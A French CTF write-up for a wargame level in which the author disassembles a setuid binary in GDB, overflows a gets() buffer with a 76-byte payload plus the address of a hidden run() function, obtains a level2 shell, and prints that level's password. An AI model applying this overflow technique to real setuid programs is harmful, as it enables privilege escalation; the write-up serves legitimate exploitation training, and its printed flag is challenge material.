Je commence par découvrir qui je suis, où je suis, et qu'est-ce qui est à ma disposition :

```
$ id && pwd && ls -la
uid=2030(level1) gid=2030(level1) groups=2030(level1),100(users)
/home/user/level1
total 17
dr-xr-x---+ 1 level1 level1   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level1 level1  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level1 level1 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level2 users  5138 Mar  6  2016 level1
-rw-r--r--+ 1 level1 level1   65 Sep 23  2015 .pass
-rw-r--r--  1 level1 level1  675 Apr  3  2012 .profile
```

Je tente de lancer le binaire level1 :

```
$ ./level1

```

Le programme ne fait rien par défaut, mais attend quelque chose. J'essaye de lui passer un input et appuie sur entrée :

```
$ ./level1
hello world?
$
```

Il ne se passe rien. J'imagine que comme le level0, il faut passer la bonne string. J'analyse le programme au travers de GDB :

```
$ gdb ./level1
(gdb) disas main
Dump of assembler code for function main:
   0x08048480 <+0>:     push   %ebp
   0x08048481 <+1>:     mov    %esp,%ebp
   0x08048483 <+3>:     and    $0xfffffff0,%esp
   0x08048486 <+6>:     sub    $0x50,%esp
   0x08048489 <+9>:     lea    0x10(%esp),%eax
   0x0804848d <+13>:    mov    %eax,(%esp)
   0x08048490 <+16>:    call   0x8048340 <gets@plt>
   0x08048495 <+21>:    leave
   0x08048496 <+22>:    ret
End of assembler dump.
```

Il y a très peu d'instruction, et il n'y a pas de comparaison, il ne s'agit donc pas de lui passer une string correcte. Un seul call ici :

```
call   0x8048340 <gets@plt>
```

Après m'être renseigné, je trouve que :

```
gets is the name of the function being called. The gets function is a standard C library function that reads a line from the standard input (stdin) into the buffer pointed to by its argument, stopping after an end-of-line character is found or EOF is reached. However, it's important to note that gets is unsafe and has been deprecated due to its vulnerability to buffer overflow attacks, as it does not check the size of the buffer it writes to.
```

et :

```
@plt stands for "Procedure Linkage Table." The PLT is used in position-independent code, like shared libraries, to call external functions whose addresses aren't known at the time of linking and need to be resolved at runtime by the dynamic linker. When a function like gets is called, the call is initially directed to an entry in the PLT. The PLT entry, in turn, works with the Global Offset Table (GOT) to find the function's actual address. If the address is unknown, the dynamic linker is invoked to resolve the function's address dynamically.
```

Ce qui souligne tout d'abord une vulnérabilité possible avec gets.
Ensuite, plt nous indique que le programme appelle une fonction qui ne fait pas partie de son code et dont l'adresse est résolue au lancement.

Il me faut donc plus d'informations, je tente du côté de la liste des fonctions dans le binaire, via GDB :

```
(gdb) info function
All defined functions:

Non-debugging symbols:
0x080482f8  _init
0x08048340  gets
0x08048340  gets@plt
0x08048350  fwrite
0x08048350  fwrite@plt
0x08048360  system
0x08048360  system@plt
0x08048370  __gmon_start__
0x08048370  __gmon_start__@plt
0x08048380  __libc_start_main
0x08048380  __libc_start_main@plt
0x08048390  _start
0x080483c0  __do_global_dtors_aux
0x08048420  frame_dummy
0x08048444  run
0x08048480  main
0x080484a0  __libc_csu_init
0x08048510  __libc_csu_fini
0x08048512  __i686.get_pc_thunk.bx
0x08048520  __do_global_ctors_aux
0x0804854c  _fini
```

J'observe trois fonctions au seins du binaire :
- frame_dummy
- run
- main

J'exclus frame_dummy suite à la lecture de cette discussion :
[What does frame_dummy mean in the context of profiling?](https://stackoverflow.com/questions/11444847/what-does-frame-dummy-mean-in-the-context-of-profiling)

main étant la fonction par défaut en C, je me penche sur `run` :

```
(gdb) disas run
Dump of assembler code for function run:
   0x08048444 <+0>:     push   %ebp
   0x08048445 <+1>:     mov    %esp,%ebp
   0x08048447 <+3>:     sub    $0x18,%esp
   0x0804844a <+6>:     mov    0x80497c0,%eax
   0x0804844f <+11>:    mov    %eax,%edx
   0x08048451 <+13>:    mov    $0x8048570,%eax
   0x08048456 <+18>:    mov    %edx,0xc(%esp)
   0x0804845a <+22>:    movl   $0x13,0x8(%esp)
   0x08048462 <+30>:    movl   $0x1,0x4(%esp)
   0x0804846a <+38>:    mov    %eax,(%esp)
   0x0804846d <+41>:    call   0x8048350 <fwrite@plt>
   0x08048472 <+46>:    movl   $0x8048584,(%esp)
   0x08048479 <+53>:    call   0x8048360 <system@plt>
   0x0804847e <+58>:    leave
   0x0804847f <+59>:    ret
End of assembler dump.
```

J'essaye de lire les valeurs des appels `mov` :
```
0x0804844a <+6>:     mov    0x80497c0,%eax

(gdb) x/s 0x80497c0
0x80497c0 <stdout@@GLIBC_2.0>:   ""

0x08048451 <+13>:    mov    $0x8048570,%eax

(gdb) x/s 0x8048570
0x8048570:       "Good... Wait what?\n"

(gdb) x/s 0x8048584
0x8048584:       "/bin/sh"
```

Il est probable que la string trouvée soit écrite par le call `fwrite` ensuite, on note aussi une string qui correspond au lancement d'un bash, probablement également passé au call `system`.

Il me faut donc réussir à exécuter la fonction `run`.
Vu que le binaire ne fait pas de comparaison, et ne print pas la string trouvé plus tôt ("Good... Wait what?\n"), j'estime que `run` n'est pas lancé par le `gets` de `main`.

Je me re-penche sur `main` pour comprendre ce qui est lancé à la place, et voir si je peux réussir à lancer `run` depuis là :

```
(gdb) disas main
Dump of assembler code for function main:
   0x08048480 <+0>:     push   %ebp
   0x08048481 <+1>:     mov    %esp,%ebp
   0x08048483 <+3>:     and    $0xfffffff0,%esp
   0x08048486 <+6>:     sub    $0x50,%esp
   0x08048489 <+9>:     lea    0x10(%esp),%eax
   0x0804848d <+13>:    mov    %eax,(%esp)
   0x08048490 <+16>:    call   0x8048340 <gets@plt>
   0x08048495 <+21>:    leave
   0x08048496 <+22>:    ret
End of assembler dump.
```

J'analyse donc plus en détails la fonction `main`. Spécifiquement ces 4 lignes :

```
   0x08048486 <+6>:     sub    $0x50,%esp
   0x08048489 <+9>:     lea    0x10(%esp),%eax
   0x0804848d <+13>:    mov    %eax,(%esp)
   0x08048490 <+16>:    call   0x8048340 <gets@plt>
```

Notes :

- `eax` (Extended Accumulator Register) stocke le résultat d'opérations
- `esp` (Extended Stack Pointer) pointe sur le haut de la stack

1. `sub` (Subtract) soustrait (0x50 = 5 * 16 + 0 * 1 = 80) du registre `esp` ce qui revient à allouer 80 bytes sur la stack

2. `lea` (Load Effective Address) déclare un pointer dont l'adresse est `esp` + (0x10 = 1 * 16 + 0 * 1 = 16) et l'attribue à `eax`. Cela pourrait signifier que les 80 bytes alloué plus tôt servent à un buffer puisque nous récupérons une adresse "haute" qui nous laisse (80 - 16 = 64) 64 bytes de mémoire à utiliser.

3. `mov` (Move) copie la valeur contenue dans `eax` sur `esp`. Cela stocke donc en haut de la stack, l'adresse calculée par `lea`. On peut inférer donc que cela revient à obtenir un buffer de 64 bytes, dont nous avons l'adresse de début.

4. `call` (Appel de fonction) appelle `gets` et prend en paramètre un pointeur.

- `gets` est une fonction de la librairie standard qui lit `stdin`. Elle prend en paramètre le premier pointeur qu'il trouve sur la stack en assembleur, donc l'adresse déclarée par `mov`, donc le début du buffer de 64 bytes.

J'en déduis donc que main déclare un buffer de 64 bytes, lequel est passé à `gets` afin qu'il stock l'input reçu.

Cela représente un point de vulnérabilité possible : `gets` ne prend pas d'argument de taille, uniquement un buffer, il est donc possible de l'overflow.

Cet overflow pourrait potentiellement me servir à lancer la fonction `run` afin d'obtenir le shell du level2.

Je me penche sur l'hypothèse :

```
$ python -c 'print "0" * 80' > /tmp/vuln
$ ./level1 < /tmp/vuln
Segmentation fault (core dumped)
```

J'arrive donc bien à overflow. Je me renseigne et suite à la lecture de cette discussion :
[Using a buffer overflow to call a function](https://reverseengineering.stackexchange.com/questions/27826/using-a-buffer-overflow-to-call-a-function)

Je décrète qu'il me faut récupèrer l'adresse qui pointe sur la fonction `run`, puis, remplacer l'`EIP` (Extended Instruction Pointer) du `return` de main par cette dernière via l'overflow.

J'ai récupèré l'adresse de `run` plus haut (0x08048444):

```
(gdb) disas run
Dump of assembler code for function run:
   0x08048444 <+0>:     push   %ebp
```

Etant donné que 80 bytes sont alloués pour main, et d'après le discussion StackOverflow, il faut que je remplisse le buffer de 64 bytes, puis insère des bytes random et enfin ajoute à la fin du buffer l'adresse de `run`. Cela aura pour effet de ré-écrire la stack et donc les instructions qui se trouvait après le buffer de 64 bytes. La stack "polluée" sera alors lue et trouvera l'adresse de `run`.

Je modifie donc mon "payload" d'exploitation :

```
$ python -c 'print "0" * 80' > /tmp/vuln
```

Il me faut lui ajouter l'adresse de `run` à la fin, pour un total de 80 bytes.
Je note également que GDB affiche les adresses mémoire en Big Endian, mais que l'architecture CPU s'attend à un format Little Endian, je dois donc inverser l'adresse de `run` quand je l'ajoute au payload.

L'adresse : `0x08048444` devient, en représentation string, `\x44\x84\x04\x08`.
Ici `\x` représente un byte en notation hexadécimale.

Etant donné que l'adresse fait 4 bytes, je créé un payload de 76 bytes :

```
$ python -c 'print "0" * 76 + "\x44\x84\x04\x08"' > /tmp/vuln
$ ./level1 < /tmp/vuln
Good... Wait what?
Segmentation fault (core dumped)
```

J'ai donc bien réussis à lancer `run`, puisque je vois la string, en revanche je n'ai pas réussis à capturer le shell qui a été, j'imagine, ouvert puis fermé.

Je me renseigne et trouve : [Why can't I open a shell from a pipelined process?](https://unix.stackexchange.com/questions/203012/why-cant-i-open-a-shell-from-a-pipelined-process)

Il est expliqué que `/bin/sh` n'est pas interactif et exit car il trouve `EOF` en lisant `stdin`.
Un commentaire suggère d'utiliser `cat` afin de le rendre interactif.

```
$ cat ./level1 < /tmp/vuln
...
```

Cette approche ne fonctionne pas et `cat` le binaire.

```
$ cat /tmp/vuln > ./level1
bash: ./level1: Permission denied
```

Cette approche ne fonctionne pas non plus. Je me renseigne et trouve que :

- `>` n'est pas le bon symbole de redirection à utiliser, car ce dernier sert à écrire l'output dans un fichier, et non pas le passer au `stdin` d'un programme.

```
$ cat /tmp/vuln | ./level1
Good... Wait what?
Segmentation fault (core dumped)
```

Ici, l'échec vient du fait que `cat` ne tente pas de lire le `stdin`, et donc passe au `stdin` de `level1` un `EOF` également. Je trouve dans le doc cependant que :

`cat` (fichier) `-` me permet de lire le fichier, puis le `stdin` donc :

```
$ cat /tmp/vuln - | ./level1
Good... Wait what?
pwd
/home/user/level1
```

Capture correctement le `stdin` du shell lancé par `run` au travers de l'exploitation du buffer overflow possible dans `main` !

Etant donné que le programme `level1` est lancé avec les droits de `level2`, je peux donc lire son `.pass` dans ce shell créé à l'intérieur du programme :

```
...
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

Toute ces observations me permettent donc d'imiter le programme défaillant dans source.py.

